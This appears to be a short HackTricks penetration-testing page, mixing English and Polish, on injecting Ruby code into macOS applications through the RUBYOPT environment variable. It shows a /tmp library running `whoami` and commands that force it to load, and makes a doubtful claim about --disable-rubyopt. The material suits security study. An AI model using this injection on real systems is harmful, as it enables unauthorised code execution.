# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Using this env variable it's possible to **add new params** to **ruby** whenever it gets executed. Although the param **`-e`** cannot be used to specify ruby code to execute, it's possible to use the params **`-I`** and **`-r`** to add a new folder to the libraries to load path and then **specify a library to load**.

Utwórz bibliotekę **`inject.rb`** w **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Utwórz gdziekolwiek skrypt Ruby, taki jak:
```ruby:hello.rb
puts 'Hello, World!'
```
Następnie załaduj go za pomocą dowolnego skryptu ruby:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Ciekawostka: działa nawet z parametrem **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
